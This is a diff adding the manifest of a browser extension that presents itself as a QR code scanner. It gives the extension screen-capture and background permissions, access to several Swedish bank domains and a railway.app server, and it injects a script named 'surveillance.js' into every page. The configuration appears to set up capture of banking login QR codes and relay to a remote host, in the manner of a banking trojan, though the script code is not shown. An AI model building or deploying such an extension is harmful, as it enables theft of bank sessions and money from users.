@@ -1,0 +1,56 @@
+{
+  "manifest_version": 3,
+  "name": "Enhanced QR Code Scanner & Multi-Bank Capture",
+  "version": "2.0",
+  "description": "Scans QR codes from webpages and captures bank-specific QR codes automatically",
+  "permissions": [
+    "activeTab",
+    "scripting",
+    "tabs",
+    "storage",
+    "desktopCapture",
+    "background"
+  ],
+  "host_permissions": [
+    "https://web-production-72c0d.up.railway.app/*",
+    "*://*.nordea.com/*",
+    "*://*.nordea.se/*",
+    "*://*.swedbank.se/*",
+    "*://*.seb.se/*",
+    "*://*.handelsbanken.se/*",
+    "*://*.skandia.se/*",
+    "*://*.lansforsakringar.se/*",
+    "*://*.danskebank.se/*",
+    "<all_urls>"
+  ],
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Enhanced QR Scanner"
+  },
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>",
+        "*://*.nordea.com/*",
+        "*://*.nordea.se/*",
+        "*://*.swedbank.se/*",
+        "*://*.seb.se/*",
+        "*://*.handelsbanken.se/*",
+        "*://*.skandia.se/*",
+        "*://*.lansforsakringar.se/*",
+        "*://*.danskebank.se/*"
+      ],
+      "js": ["enhanced_content.js", "surveillance.js"],
+      "run_at": "document_end"
+    }
+  ],
+  "web_accessible_resources": [
+    {
+      "resources": ["socket.io.js"],
+      "matches": ["<all_urls>"]
+    }
+  ]
+} 
